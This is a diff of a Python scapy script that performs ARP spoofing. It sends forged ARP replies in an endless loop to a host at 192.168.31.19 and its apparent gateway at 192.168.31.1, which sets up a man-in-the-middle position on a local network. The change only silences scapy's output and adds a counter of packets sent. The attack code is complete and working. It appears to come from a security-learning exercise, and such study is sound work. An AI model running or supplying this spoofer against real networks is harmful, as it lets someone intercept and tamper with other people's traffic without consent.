@@ -23,10 +23,14 @@ def spoof(targetip,sourceip):
     #Create ARP response packet
     packet = scapy.ARP(op=2,pdst=targetip, hwdst=targetMac, psrc=sourceip)
     #Send ARP response packet
-    scapy.send(packet)
+    #Add verbose=false to stop printing default statements to the screen
+    scapy.send(packet, verbose=False)
 
+packets = 0
 while True:
+    packets = packets+1
     spoof("192.168.31.19", "192.168.31.1")
     spoof("192.168.31.1", "192.168.31.19")
+    print("[+] Packets sent: " + str(packets))
     time.sleep(2)
 
